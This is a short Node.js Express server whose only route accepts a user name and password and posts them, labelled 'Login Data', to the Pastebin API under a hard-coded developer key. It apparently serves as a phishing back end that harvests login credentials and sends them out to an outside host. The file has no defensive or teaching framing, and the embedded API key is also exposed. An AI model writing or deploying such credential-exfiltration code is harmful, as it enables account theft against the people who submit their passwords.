import express from "express";
import fetch from "node-fetch";

const app = express();
app.use(express.json());

app.post("/submit", async (req, res) => {
  const { userName, password } = req.body;
  try {
    const response = await fetch("https://pastebin.com/api/api_post.php", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams({
        api_dev_key: "j-ZxFe6iQaCvQ8U8R6Syr8fYUYT-Bo92",
        api_option: "paste",
        api_paste_code: `User Name: ${userName}\\nPassword: ${password}`,
        api_paste_name: "Login Data",
        api_paste_private: "1",
      }),
    });

    const result = await response.text();
    res.send({ success: true, pasteUrl: result });
  } catch (error) {
    console.error("Error submitting to Pastebin:", error);
    res.status(500).send({ success: false, error: "Failed to submit data" });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
